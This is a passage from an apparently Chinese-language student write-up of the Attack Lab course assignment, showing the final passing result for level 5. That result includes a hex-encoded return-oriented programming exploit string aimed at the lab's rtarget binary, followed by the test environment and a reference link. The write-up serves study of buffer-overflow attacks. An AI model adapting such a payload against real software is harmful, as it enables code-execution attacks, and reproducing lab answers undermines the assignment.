        result  1:PASS:0xffffffff:rtarget:3:C2 A9 20 32 30 31 39 20 43 6F 70 79 72 69 67 68 74 20 48 61 6B 75 6C 61 2C 20 43 43 20 42 59 2D 4E 43 2D 53 41 20 00 00 CC 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

##### 5.4.5 运行结果

{{< image src="assets/level-5.webp" caption="Level 5 运行结果" width="100%" >}}

## 测试环境

- Ubuntu 18.04.3 LTS (GNU/Linux 5.0.0-32-generic x86_64)
- GCC 7.4.0
- GDB 8.1.0

## 参考资料

1. [Assignment #4: Attack Lab - CS356 Introduction to Computer Systems - USC](https://usc-cs356.github.io/assignments/attacklab.html)
